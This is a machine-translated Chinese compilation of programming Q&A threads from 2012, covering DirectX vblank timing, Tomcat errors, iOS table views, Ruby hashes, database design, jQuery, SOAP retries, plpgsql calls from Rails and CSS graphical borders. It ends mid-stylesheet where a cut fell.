仅仅打电话`pSwapChain->present(1,0)`是不够的。这将防止在全屏模式下撕裂，但它不会等待 vblank 发生。当前调用是异步的，如果还有帧缓冲区要填充，它会立即返回。因此，如果您的渲染代码非常快速地生成一个新帧（比如渲染所有内容需要 10 毫秒）并且用户已将驱动程序的“最大预渲染帧数”设置为 4，那么您将在用户看到的内容之前渲染四帧。这意味着鼠标动作和屏幕响应之间有 4*16.7=67ms 的延迟，这是不可接受的。请注意，驱动程序的设置获胜 - 即使您的应用程序要求`pOutput->setMaximumFrameLatency(1)`，无论如何你都会得到 4 帧。因此，无论驱动程序设置如何，保证没有鼠标延迟的唯一方法是让您的渲染循环自愿等待到下一个垂直刷新间隔，这样您就永远不会使用那些额外的帧缓冲区。

`IDXGIOutput::WaitForVBlank()`旨在用于此目的。但它不起作用！当我调用以下

```
<render something in ~10ms>
pSwapChain->present(1,0);
pOutput->waitForVBlank(); 
```

我测量了`waitForVBlank()`调用返回所需的时间，我看到它大约在 6 毫秒和 22 毫秒之间交替。

怎么会这样？怎么可能`waitForVBlank()`需要超过 16.7 毫秒才能完成？在 DX9 中，我们通过`getRasterState()`实现我们自己的更准确的 waitForVBlank 版本解决了这个问题。但是那个调用在 DX11 中被弃用了。

有没有其他方法可以保证我的帧与显示器的刷新率完全一致？是否有另一种方法可以像 getRasterState 那样监视当前的扫描线？

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-08T14:28:38.003

> 我之前尝试使用带有 WGL_EXT_swap_control 扩展的 OpenGL，通过绘制然后调用
> 
> ```
> SwapBuffers(g_hDC);
> glFinish(); 
> ```

glFinish() 或 glFlush 是多余的。SwapBuffers 意味着 glFinish。

会不会是在您的图形驱动程序设置中设置了“强制 V-Blank / V-Sync 关闭”？

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2015-09-22T22:24:01.337

我们现在用的是DX9，想换DX11。我们目前使用`GetRasterState()`手动同步到屏幕。这在 DX11 中消失了，但我发现制作 DirectDraw7 设备似乎不会破坏 DX11。因此，只需将其添加到您的代码中，您就应该能够获得扫描线位置。

```
IDirectDraw7* ddraw = nullptr;
DirectDrawCreateEx( NULL, reinterpret_cast<LPVOID*>(&ddraw), IID_IDirectDraw7, NULL );
DWORD scanline = -1;
ddraw->GetScanLine( &scanline ); 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2015-10-06T23:42:30.810

在 Windows 8.1 和 Windows 10 上，您可以使用 DXGI 1.3 `DXGI_SWAP_CHAIN_FLAG_FRAME_LATENCY_WAITABLE_OBJECT`。请参阅[MSDN](https://msdn.microsoft.com/en-us/library/windows/apps/dn448914.aspx)。此处的示例适用于 Windows 8 应用商店应用程序，但它也应该适用于 Win32 类 Windows 交换链。

您可能会发现此[视频](https://www.youtube.com/watch?v=E3wTajGZOsA)也很有用。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-05-08T14:24:59.500

创建 Direct3D 设备时，将结构的`PresentationInterval`参数设置为.`D3DPRESENT_PARAMETERS``D3DPRESENT_INTERVAL_DEFAULT`

* * *

## 回答 #6

> 赞同：-1
> 
> 时间：2015-09-02T10:49:25.143

如果您在内核模式或 ring-0 下运行，您可以尝试从[VGA 输入寄存器](http://www.osdever.net/documents/vga_ports.txt)(03bah,03dah) 读取位 3。该信息相当陈旧，但尽管[此处暗示](http://www.compuphase.com/vretrace.htm)该位可能已更改位置或可能在更高版本的 Windows 2000 及更高版本中已过时，但我实际上对此表示怀疑。第二个链接有一些非常古老的源代码，它们试图公开旧 Windows 版本的 vblank 信号。它不再运行，但理论上用最新的 Windows SDK 重建它应该可以解决这个问题。

困难的部分是构建和注册一个可靠地公开此信息的设备驱动程序，然后从您的应用程序中获取它。

# tomcat - 在 Windows 中使用 Tomcat 运行 MyFaces 项目时出现问题 (java.lang.LinkageError)

> ID：10499735
> 
> 赞同：0
> 
> 时间：2012-05-08T13:38:09.103
> 
> 标签：tomcat, sts-springsourcetoolsuite, myfaces

我正面临这个我无法理解错误的问题。这个项目在 Mac 上运行正常，但在 Windows 上发生了这样的事情：

```
GRAVE: Exception sending context initialized event to listener instance of class org.apache.myfaces.webapp.StartupServletContextListener
java.lang.LinkageError: loader constraint violation: when resolving interface method "javax.servlet.jsp.JspApplicationContext.addELResolver(Ljavax/el/ELResolver;)V" the class loader (instance of com/springsource/insight/collection/tcserver/ltw/TomcatWeavingInsightClassLoader) of the current class, org/apache/myfaces/webapp/Jsp21FacesInitializer, and the class loader (instance of org/apache/catalina/loader/StandardClassLoader) for resolved class, javax/servlet/jsp/JspApplicationContext, have different Class objects for the type javax/el/ELResolver used in the signature
    at org.apache.myfaces.webapp.Jsp21FacesInitializer.configureResolverForJSP(Jsp21FacesInitializer.java:129)
    at org.apache.myfaces.webapp.Jsp21FacesInitializer.initContainerIntegration(Jsp21FacesInitializer.java:77)
    at org.apache.myfaces.webapp.AbstractFacesInitializer.initFaces(AbstractFacesInitializer.java:140)
    at org.apache.myfaces.webapp.StartupServletContextListener.contextInitialized(StartupServletContextListener.java:111)
    at org.apache.catalina.core.StandardContext.listenerStart(StandardContext.java:4723)
    at org.apache.catalina.core.StandardContext$1.call(StandardContext.java:5226)
    at org.apache.catalina.core.StandardContext$1.call(StandardContext.java:5221)
    at java.util.concurrent.FutureTask$Sync.innerRun(FutureTask.java:303)
    at java.util.concurrent.FutureTask.run(FutureTask.java:138)
    at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
    at java.lang.Thread.run(Thread.java:662)
08/05/2012 10:32:48 org.apache.catalina.core.ApplicationContext log 
```

我在两个平台上使用相同版本的 Eclipse SpringSource Tool Suite。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-08T15:51:45.393

所以我搬到了 Tomcat 7。源代码和 Eclipse 项目没有变化。它正在工作。

我想，也许，我的 STS 安装损坏了。我会结束这个问题。

# iphone - Xcode：使用 NSUserDefaults 和 TableView 保存数据问题

> ID：10499736
> 
> 赞同：2
> 
> 时间：2012-05-08T13:38:09.853
> 
> 标签：iphone, xcode, uitableview, ios5, nsuserdefaults

我正在尝试通过 NSUserDefaults 保存数据并在 tableView 上查看它但是在我单击保存按钮后没有任何反应，在我停止并再次运行应用程序之后我保存的数据我可以看到它每次覆盖旧数据。难道我做错了什么？或者我应该使用与 NSUserDefaults 不同的东西吗？

提前致谢。

```
-(IBAction)save{

    NSUserDefaults *add1 = [NSUserDefaults standardUserDefaults];
    [add1 setObject:txt1.text forKey:@"txt1"];

    [add1 synchronize]; 
}

- (void)viewDidLoad
{
    [super viewDidLoad];

    NSUserDefaults *prefs = [NSUserDefaults standardUserDefaults];
    self.dataArray = [NSArray arrayWithObjects:[prefs objectForKey:@"txt1"], nil];
}

- (NSInteger)numberOfSectionsInTableView:(UITableView *)tableView
{
    return 1;
}

 - (NSInteger)tableView:(UITableView *)tableView numberOfRowsInSection:(NSInteger)section
{
    return [dataArray count];
}

- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath
{
    NSString *string = [dataArray objectAtIndex:indexPath.row];

    static NSString *CellIdentifier = @"Cell";

    UITableViewCell *cell = [tableView dequeueReusableCellWithIdentifier:CellIdentifier];

    if(cell==nil)
{
    cell = [[[UITableViewCell alloc] initWithStyle:UITableViewCellStyleDefault  reuseIdentifier:CellIdentifier] autorelease];
}
    cell.textLabel.text=string;

    return cell;
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-08T14:05:57.190

正如**A for Alpha**所说，尝试一下，此外我也对您的`save`方法定义有疑问。只需尝试将其更改为以下内容

```
-(IBAction)save:(id)sender{
    NSUserDefaults *add1 = [NSUserDefaults standardUserDefaults];
    [add1 setObject:txt1.text forKey:@"txt1"];

    [add1 synchronize];
    [tableView reloadData];
} 
```

这可能对你有用。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-08T14:10:20.117

您的代码中有两个问题：

您没有刷新表格视图。你可以通过调用来做到这一点：

```
[self.tableView reloadData]; // Or whatever property is pointing to your tableview 
```

每次保存一个值时，都会将其保存在同一个键 ( `txt1`) 下，这就是每次都覆盖的原因。如果你想要一个项目列表（一个数组）并将项目附加到这个数组中，你可以这样做：

```
NSMutableArray *myList = [[[NSUserDefaults standardUserDefaults] valueForKey:@"myTxtList"] mutableCopy];
[myList addObject:txt1.text];
[[NSUserDefaults standardUserDefaults] setObject:[NSArray arrayWithArray:myList] forKey:@"myTxtList"];
[add1 synchronize]; 
self.dataArray = myList;
[self.tableView reloadData]; 
```

PS当然你需要`dataArray`在你的`viewDidLoad`：

```
self.dataArray = [[NSUserDefaults standardUserDefaults] objectForKey:@"myTxtList"]; 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-08T13:50:04.840

我想您需要 `[yourTableView reloadData]`在将数据保存到`userDefaults`. 这应该可以解决您的问题。

# c# - QuickFix.ConfigError：配置失败：未定义 FileLogPath

> ID：10499738
> 
> 赞同：3
> 
> 时间：2012-05-08T13:38:13.243
> 
> 标签：c#, quickfix

当我在我的 quickfix 配置文件中设置参数 FileLogPath （值：传出）并尝试执行以下操作时：

```
 SessionSettings sessionSettings = new SessionSettings(CfgFile);
                FileStoreFactory fileStoreFactory = new FileStoreFactory(sessionSettings);
                FileLogFactory fileLogFactory = new FileLogFactory(sessionSettings); 
                ScreenLogFactory screenLogFactory = new ScreenLogFactory(sessionSettings);
                MessageFactory messageFactory = new DefaultMessageFactory(); 
```

之后尝试使用以下命令初始化 socketInitiator：

```
socketInitiator = new ThreadedSocketInitiator(application, fileStoreFactory, sessionSettings, fileLogFactory, messageFactory); 
```

我得到异常

```
QuickFix.ConfigError: Configuration failed: FileLogPath not defined 
```

但是当我为 FileLogFactory 设置直接路径时

```
 FileLogFactory fileLogFactory = new FileLogFactory("outgoing"); 
```

一切正常。

我究竟做错了什么？

配置文件看起来像这样：

```
[DEFAULT]
[SESSION]
ConnectionType=initiator
HeartBtInt=30
ReconnectInterval=5
FileStorePath=incoming
FileLogPath=outgoing
SenderSubId=xxxxx
Password=yyyyy
StartTime=00:00:00
EndTime=00:00:00
SocketConnectHost=aaa.aaa.aaa.aaa
SocketConnectPort=bbb
CheckLatency=N
BeginString=FIX.4.4
SenderCompId=rrrrrr
TargetCompId=vvvvvv
DataDictionary=./Specs/FIX44.xml
ValidateUserDefinedFields=N 
```

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-05-15T10:18:58.387

请尝试移动

```
FileStorePath=incoming 
FileLogPath=outgoing 
```

在配置 [DEFAULT] 部分。

# ruby - 在 ruby 中收集数组的哈希

> ID：10499744
> 
> 赞同：1
> 
> 时间：2012-05-08T13:38:27.107
> 
> 标签：ruby, hash

```
h = {1=>[1,2,3], 2=>[4,5,6]}
new_arr = []
h.each_value {|arr|
  new_arr.concat(arr)
}

```

这行得通，但有什么更类似于红宝石的方法呢？

所有值都是数组，但不应修改每个数组的元素。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-05-08T13:44:34.450

这个怎么样？

```
h.values.flatten 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-05-08T13:42:02.643

您可以使用减少：

```
h.values.reduce(&:+) 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-13T09:51:29.420

有点神秘

```
h.flat_map(&:last) 
```

有点冗长

```
h.flat_map{|_, value| value} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-08T13:57:59.780

如果要获取哈希值数组，请使用 Hash#values。

```
new_arr = h.values 
```

# database-design - 在mysql中捕获双向关系

> ID：10499745
> 
> 赞同：0
> 
> 时间：2012-05-08T13:38:31.793
> 
> 标签：database-design

我有两个表：
1）用户
2）场景

它们之间的关系可以描述为：

用户可以有 0 个或多个场景
场景必须与一个用户关联

一种方法是创建 User_Scenario_rels 并使用用户和场景表中的 ID 来创建关系。但这是最佳实践吗？这是一对多的关系吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-08T13:45:02.390

这是一种“一对多”的关系——一个场景有一个用户，一个用户有很多场景。

它通常由场景表上的“user_id”列建模。

就现场实践的数据库设计而言，“一个用户有0个或多个场景”和“一个用户有1个或多个场景”之间没有区别；理论上，如果您想强制规定所有用户必须至少有 1 个场景，您将实施一个约束。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-08T14:10:28.777

> 一种方法是创建 User_Scenario_rels 并使用用户和场景表中的 ID 来创建关系。但这是最佳实践吗？这是一对多的关系吗？

它是否符合您的要求并实现 1:n 关系取决于您是否正确获取键和约束。这不是唯一的方法，在这种特殊情况下，它允许在没有用户的情况下存在场景。

```
create table users (
  user_id integer primary key
);

create table scenarios (
  scenario_id integer primary key
);

-- Separate table allows users to have zero scenarios.
create table user_scenarios (
  user_id integer not null references users (user_id),
  scenario_id integer not null references scenarios (scenario_id),
  -- This primary key lets each user have multiple scenarios
  primary key (user_id, scenario_id),
  -- This unique constraint allows each scenario id number to 
  -- be used only once. (So it's associated with only one user.)
  unique (scenario_id)
); 
```

正如 Neville K 所说，在场景表中包含一个不可为空的 user_id 列会更好（也更容易）。

# python - 使用 db.ReferenceProperty 引用 Google App Engine 中的其他表

> ID：10499747
> 
> 赞同：1
> 
> 时间：2012-05-08T13:38:35.357
> 
> 标签：python, django, google-app-engine

我有一个由表格填充的模型（公司类别） - 简单的名称等。然后我有一个公司模型，我想将这两者链接在一起，这样我在填充的下拉框中就有了类别。

```
class CompanyCategory(db.Model):
    categoryname = db.StringProperty(required=True) 

class Company(db.Model):
    companyurl = db.StringProperty(required=False)
    companycategory = db.ReferenceProperty(CompanyCategory, collection_name='category') 
```

但是，当我这样做时，我收到以下错误：

```
<class 'google.appengine.ext.db.DuplicatePropertyError'>: Class CompanyCategory already has property categoryname 
Traceback (most recent call last):
  File "/base/data/home/apps/XXX/1.358759458095086806/showcompanies.py", line 52, in <module>
    class Company(db.Model):
  File "/base/python_runtime/python_lib/versions/1/google/appengine/ext/db/__init__.py", line 514, in __init__
    _initialize_properties(cls, name, bases, dct)
  File "/base/python_runtime/python_lib/versions/1/google/appengine/ext/db/__init__.py", line 429, in _initialize_properties
    attr.__property_config__(model_class, attr_name)
  File "/base/python_runtime/python_lib/versions/1/google/appengine/ext/db/__init__.py", line 3656, in __property_config__
    self.collection_name)) 
```

我该如何进行这项工作？我看过一些例子，但在这种情况下我无法工作。我怎样才能使公司类别成为一个列表。

这是表中的内容：

公司类别实体

```
‹ Prev 20 1-1 Next 20 ›
    ID/Name     categoryname
    id=96001    ss 
```

* * *

这就是模型定义相反的地方。我希望每家公司都有一个从表格中填充的类别。通过以下定义，我可以获得类似于我正在寻找的东西：

```
class CompanyCategory(db.Model):
    categoryname = db.StringProperty(required=False)
    def __unicode__(self):
            return u'%s' % (self.categoryname)

class Company(db.Model):
    companyurl = db.StringProperty(required=False)
    companyname = db.StringProperty(required=False)
    companydesc = db.TextProperty(required=False)
    companyaddress = db.PostalAddressProperty(required=False)
    companypostcode = db.StringProperty(required=False)
    companyemail = db.EmailProperty(required=False)
    companycountry = db.StringProperty(required=False)

    companyvalid = db.BooleanProperty()
    companyentrytime = db.DateTimeProperty(auto_now_add=True)
    companylatlong = db.GeoPtProperty()
    companycategory = db.ReferenceProperty(CompanyCategory) 
```

现在，当我要添加公司时，我会得到一个下拉框 - 从表中的值填充。但是，我没有在提交时将下拉列表中的值填充到数据存储中的文本值中。这应该怎么做？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-15T05:36:17.107

将您的代码粘贴到[shell.appspot.com](http://shell.appspot.com/)可以正常工作 - 所以无论您的问题的原因是什么，您的示例代码都不能代表它。正如 Christopher Ramirez 建议的那样，您可能会`companycategory`在同一模型中或在模型的父类中声明两次。

# php - 如何取回请求对话框的数据参数？

> ID：10499748
> 
> 赞同：0
> 
> 时间：2012-05-08T13:38:35.693
> 
> 标签：php, facebook, facebook-graph-api

我需要使用 Facebook 的请求对话框让用户邀请他们的朋友。`data`我对请求对话框的参数有疑问。

[https://developers.facebook.com/docs/reference/dialogs/requests/](https://developers.facebook.com/docs/reference/dialogs/requests/)

**数据：**可选的，您可以传递用于跟踪的附加数据。这将作为创建的请求对象的一部分存储。最大长度为 255 个字符。

如果我将此参数设置为 1234 之类的 id，当用户授权应用程序单击邀请消息中的链接时，如何取回此值 (1234)？

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-08T13:57:35.927

当用户单击请求并进入您的页面（使用“request_ids”参数）时，您应该获取请求的数据。

获取请求的 url：

> [https://graph.facebook.com/USER_ID/apprequests](https://graph.facebook.com/USER_ID/apprequests)

您将获得请求列表和每个请求的数据（如果已发送）。使用在 request_ids 参数中传递给您的 id 获取您需要的请求，并在其中找到“data”字段，该字段应包含您与请求一起发送的数据（在您的示例中为 1234）。

[在请求指南](http://developers.facebook.com/docs/requests/)中阅读有关请求的更多信息。

# jquery - 增加列表项类

> ID：10499752
> 
> 赞同：1
> 
> 时间：2012-05-08T13:38:40.400
> 
> 标签：jquery, css, list, show-hide, increment

我想使用 jQuery 创建一个具有递增 id 和 href 的列表。这可能吗？

```
<ul id="links">
  <li><a href="#item1">Item number 1</a></li>
  <li><a href="#item2">Item number 2</a></li>
  <li><a href="#item3">Item number 3</a></li>
  <li><a href="#item4">Item number 4</a></li>
  <li><a href="#item5">Item number 5</a></li>
</ul>

<div id="toShow">
    <div id="item1" style="display:block;"></div>
    <div id="item2" style="display:none;"></div>
    <div id="item3" style="display:none;"></div>
    <div id="item4" style="display:none;"></div>
    <div id="item5" style="display:none;"></div>
</div> 
```

这些列表项将通过循环生成，我想使用这个插件[http://www.bijusubhash.com/demo/show-hide-a-div-at-a-time-with-jquery/](http://www.bijusubhash.com/demo/show-hide-a-div-at-a-time-with-jquery/)

谢谢，大卫

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-08T13:47:28.070

**HTML：**

这个 div 将包含生成的项目。您可以将这些列表附加到其他地方。

```
<div id="container"></div> 
```

**jQuery：**

```
var ul = $('<ul id="links"></ul>'),  // creates an ul
        div = $('<div id="toShow"></div>'); // creates a div

    for(var i = 1; i <= 5; i++) { // loop for add item (suppose five items)
      ul.append('<li id="list_'+ i +'"><a href="#item'+ i +'">Item number '+ i +'</a></li>');
      div.append('<div id="item'+ i +'" style="display:block;">Item '+ i +'</div>');
    }

    $('#container').append(ul, div); // append those ul and div to document give life 
```

**[演示](http://jsfiddle.net/8MWBw/)**

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-08T14:53:49.767

我可以假设：您实际上需要的比您想象的要简单得多：

## *[演示链接](http://jsbin.com/oyavuz/3/edit)*

HTML：（是的，没有自定义 ID 的混乱）

```
<ul id="links">
  <li><a href="#">Item 1</a></li>
  <li><a href="#">Item 2</a></li>
  <li><a href="#">Item 3</a></li>
  <li><a href="#">Item 4</a></li>
  <li><a href="#">Item 5</a></li>
</ul>

<div id="toShow">
    <div>First element</div>
    <div>Second element</div>
    <div>Third element</div>
    <div>Fourth element</div>
    <div>Fifth element</div>
</div> 
```

还有一些 jQuery 行：

```
$('#toShow>div:gt(0)').hide(); // hide all but first
$('#links li').on('click',function(e){
    $('#toShow>div:eq('+$(this).index()+')').show(1700).siblings('div').stop(1).hide(1700);
    return false;
}); 
```

更多信息：
[http ://api.jquery.com/](http://api.jquery.com/)

# javascript - 使用 javascript 在许多 DOM 元素上触发事件

> ID：10499753
> 
> 赞同：0
> 
> 时间：2012-05-08T13:38:41.643
> 
> 标签：javascript, events, javascript-events

我想知道是否可以在不同 DOM 元素（“li”、“a”、“input”等）上的 javascript 中同时触发多个事件（不仅仅是一个元素具有一种类型的事件），我正在使用函数 fireEvent(element , event) 仅使用一个元素和一种事件（例如 onchange）来完成这项工作：

```
function fireEvent(element,event) {
   if (document.createEvent) {
   // dispatch for firefox + others
   var evt = document.createEvent("HTMLEvents");
   evt.initEvent(event, true, true ); // event type,bubbling,cancelable
   return !element.dispatchEvent(evt);
   } else {
   // dispatch for IE
   var evt = document.createEventObject();
   return element.fireEvent('on'+event,evt)
}
} 
```

如何使用此功能在许多 DOM 元素上触发许多事件
谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-08T14:22:17.273

这可以用 jQuery 来完成。

```
$("elements").action1().action2() 
```

拥有 queue:false 将同时触发所有操作。
不知道我是否正确理解了您的要求。

[http://jsfiddle.net/t8mr7/1/](http://jsfiddle.net/t8mr7/1/) 所有 4 个动作都在同一个事件触发器中执行。

# php - php 和soap... 可能会发现错误？

> ID：10499755
> 
> 赞同：-1
> 
> 时间：2012-05-08T13:38:49.250
> 
> 标签：php, soap

该脚本在带有 nusoap 库的 php 4 上运行

```
require_once('nusoap/lib/nusoap.php');
ini_set("soap.wsdl_cache_enabled", "0");
$client = new soapclient("some-url",true);
$err = $client->getError();
if ($err) 
{
header("Location: error-page");
exit();
} 
```

我的问题是：如果检测到错误，是否可以等待 1-2 秒（类似于 sleep(2); ）然后尝试重新启用肥皂连接？并供将来参考......我怎样才能得到所有可能的错误并为他们构建案例？例如对于一些错误等待重新初始化连接，对于一些其他错误，记录到 db 原因，其余的只是重定向到一般错误页面。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-08T14:59:11.563

你知道如何编程，对吧？只需将代码放入循环中：

```
$retries = 3; // how many times to retry the connection
$sleep   = 2; // number of seconds to sleep in-between retries

$i = 1;
while (TRUE) {

    $client = new soapclient("some-url",true);

    if ( ! $client->getError()) {
        break; // break out of the loop on success
    } elseif ($i === $retries) {
        header("Location: error-page");
        exit();
    }

    sleep($sleep);
    ++$i;
} 
```

# jquery - 将图像覆盖在另一个上并将它们都保留在背景中

> ID：10499757
> 
> 赞同：1
> 
> 时间：2012-05-08T13:38:52.300
> 
> 标签：jquery, html, css

我有 2 张图像需要在将它们保留在背景中的同时使用，目前我使用了以下代码：

```
<div id="about_splash">
<img style="width:85%" src="image_src" />
</div> 
```

其中 about_splash 具有背景 css 属性

问题是，这两张图片需要在其他一些 html 对象的背景中。这将在 div#about_splash 的上方和下方。

我尝试放置 z-index，但没有奏效。

如果我使用以下代码，如何缩放内部图像使其比父图像大一点

```
 <div style="background: url(layout/images/illustration.gif) 
        no-repeat center;min-    height:500px;">

    </div>
</div> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-08T13:42:40.617

**编辑：** CSS3 允许这种事情，它看起来像这样：

```
body {
    background-image: url(images/bg.png), url(images/bgtop.png);
    background-repeat: repeat, repeat-x;
} 
```

但是，如果您需要支持 IE8 或更低版本，那么您可以解决它的最佳方法是拥有额外的 div：

```
<body>
    <div id="bgTopDiv">
        content here
    </div>
</body>

body{
    background-image: url(images/bg.png);
}
#bgTopDiv{
    background-image: url(images/bgTop.png);
    background-repeat: repeat-x;
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-08T13:58:32.480

试着看看这个，[http://www.w3schools.com/cssref/pr_pos_z-index.asp](http://www.w3schools.com/cssref/pr_pos_z-index.asp)可能会给你更多的想法，而且你可以在底部进行测试。

谢谢，大卫

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-08T15:05:24.583

**Farhan Ahmad**已经为您提供了一个很好的答案，但是我想进一步贡献一点，也许将来会对您有所帮助。

这是我不久前使用的一个小代码片段，用于将容器定位**在屏幕的死点，**然后将另一个容器定位在第一个容器的中间。定位是流动的，它取决于观看者的分辨率。

**HTML：**

```
<div id="parentContainer">
    <div id="childContainer">
       <!-- I'm the center of attention -->
    </div>
</div>​ 
```

**CSS：**

```
#parentContainer
{
    height: 200px;
    width: 200px;
    background: #9dc0dd;
    position: absolute;
    top: 50%;
    left: 50%;
    margin-top: -100px; /*This is half of the container Height*/
    margin-left: -100px; /*This is half of the container Width*/
}

#childContainer
{
    height: 100px;
    width: 100px;
    background: #435c68;
    position: relative;
    top: 50%;
    left: 50%;
    margin-top: -50px; /*This is half of the container Height*/
    margin-left: -50px; /*This is half of the container Width*/
}​ 
```

可以在[此处](http://jsfiddle.net/g2w7e/24/)找到上述代码段的演示。

# ruby-on-rails - 如何从 Ruby on rails 调用 plpgsql 函数？

> ID：10499760
> 
> 赞同：2
> 
> 时间：2012-05-08T13:39:10.617
> 
> 标签：ruby-on-rails, ruby-on-rails-3, postgresql

如何从 Ruby on Rails 应用程序调用 plpgsql 函数？

这是函数定义：

```
CREATE OR REPLACE FUNCTION add_org_pincode(i_user_id integer, i_org_id integer, i_amount numeric, i_pincode_id integer)
  RETURNS integer AS
$BODY$
Declare
  v_org_balance    numeric;
Begin
  Select o.balance
    Into Strict v_org_balance
    From organizations o
      Left Join organizations d On o.parent_organization_id = d.id
    Where o.id = i_org_id
    For Update Of o;
  --
  Insert Into org_balance_transactions(organization_id, balance, amount_added, reason, action_user_id, transaction_id)
    Values (i_org_id, v_org_balance, i_amount, 10, i_user_id, i_pincode_id);
  --
  Update organizations
    Set balance = balance + i_amount
    Where id = i_org_id;
  -- Other error
  Return 0;
End;$BODY$
  LANGUAGE 'plpgsql' VOLATILE; 
```

那么，我该怎么打电话`add_org_pincode`呢？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-15T18:39:14.907

这是我已经证明的一个例子，它可能会对你有所帮助......

```
CREATE LANGUAGE plpgsql;

/**PROMEDIOS**/
CREATE OR REPLACE FUNCTION average(valores NUMERIC[],OUT prom NUMERIC) AS $$
DECLARE
    element_count INT4;
    sum numeric := 0.0;
BEGIN

    element_count := array_upper(valores, 1) - array_lower(valores, 1) +1;
    FOR i IN array_lower(valores, 1) .. array_upper(valores, 1)
    LOOP
        sum := sum + valores[i];
    END LOOP;
    prom := trunc(sum/element_count,1);
END;
$$ LANGUAGE plpgsql; 
```

显然你必须在你的数据库中执行这个 SQL，只需将它添加到 PGAdmin 中的 SQL 编辑器（指向你的数据库）中，执行之后，这个函数必须像这样可用`select average(ARRAY[4.5,3.2,7.0]);`。

在 Rails 控制台中，我尝试了这样的示例：

```
_calificaciones = Calificacion.all(:conditions => ["promedio_parciales != average(array[parcial1,parcial2,parcial3])"]) 
```

它对我来说很好......祝你好运......

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-08T15:11:34.987

就像其他人所说的那样，类似于：

```
result = connection.execute ("SELECT add_org_pincode(#{user_id}, #{org_id}, #{amount}, #{pincode_id};") 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-08T13:42:25.687

你可以直接去 ActiveRecord::Base.connection 执行 SQL [，这是我](http://www.deploymentzone.com/2012/04/09/postgres-table-value-functions-and-rails-3/)为一些原型代码所做的......

```
result = ActiveRecord::Base.connection.execute("SELECT * FROM stock_hourly_performance(#{stock_id})") 
```

我不知道它是否是解决问题的最佳方法，但它让我开始运行。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-08T13:42:44.120

您可以使用以下命令执行原始 SQL：

```
ActiveRecord::Base.connection.execute('SQL goes here') 
```

确保绝对有必要绕过 ActiveRecord（Rail 的 ORM）。

# html - 使用 CSS 在 DIV 上自定义图形边框

> ID：10499762
> 
> 赞同：9
> 
> 时间：2012-05-08T13:39:21.257
> 
> 标签：html, layout, css

好的，所以这是一个一直困扰我一段时间的问题，我已经看到了一些好的和坏的解决方案。但是什么是最好的解决方案，什么是陷阱，缺点和大*“不，不”*。

我想要的是创建具有自定义图形边框的动态、灵活的 DIV 块。例如带有阴影的 DIV 框，但**不一定****是 shadows**。

***更新：*** 正如@Jeroen 在评论中所说，我不仅要求“制作阴影的最佳方式”。任何疯狂的自定义**图形边框**。

我知道有一些 CSS3 ( `box-shadow`,`border-image`和`border-radius`) 的解决方案，但它不是**100% 跨浏览器**，特别是如果你必须使用一两个版本的旧浏览器。

***我想要实现的示例图像：***

![使用 CSS 示例图像在 DIV 上自定义图形边框](../Images/f9fb2b18e12393e40b526197e7ce2324.png)

***或者***

![使用 CSS 示例图像在 DIV 上自定义图形边框](../Images/9c02a219bf0bfd554524e8e7659b205a.png)

上面的例子实际上是用我经常使用的一种方法完成的。它完成了这项工作，并且确实满足了所有要求。

*   它适应不同大小的 DIV 块。
*   它使用自定义图形。
*   它适用于跨浏览器和版本。
*   申请起来非常简单快捷。
*   它是免费的 JavaScript，100% CSS/HTML。

...但当然有一些缺点：

*   它需要 8 张图像。
*   *它需要 8 个没有实际内容*的额外 DIV 块。
*   源代码不是很漂亮。

**HTML DIV 块示例：**

```
<div class="flowBox">
    <h1>Header 1</h1>

    Vivamus tincidun...

    <div class="border_t"></div>
    <div class="border_b"></div>
    <div class="border_l"></div>
    <div class="border_r"></div>
    <div class="border_br"></div>
    <div class="border_bl"></div>
    <div class="border_tr"></div>
    <div class="border_tl"></div>
</div> 
```

**CSS 示例：**

```
<style type="text/css">
<!--
.flowBox {
    background:#FFFFFF;
    margin:10px;
    float:left;
    padding:10px;
    width:250px;
    position:relative;
}
.border_t {
    background:url(border_t.png) repeat-x;
    position:absolute;
    top:-2px; left:0;
    width:100%;
    height:2px;
}
.border_b {
    background:url(border_b.png) repeat-x;
    position:absolute;
    bottom:-6px; left:0;
    width:100%;
    height:6px;
}
.border_l {
    background:url(border_l.png) repeat-y;
    position:absolute;
    top:0; left:-3px;
    width:3px;
    height:100%;
}
.border_r {
    background:url(border_r.png) repeat-y;
    position:absolute;
    top:0; right:-6px;
    width:6px;
    height:100%;
}
.border_br {
    background:url(border_br.png);
    position:absolute;
    bottom:-6px; right:-6px;
    width:6px;
    height:6px;
}
.border_bl {
    background:url(border_bl.png);
    position:absolute;
    bottom:-6px; left:-3px;
    width:3px;
    height:6px;
}
.border_tr {
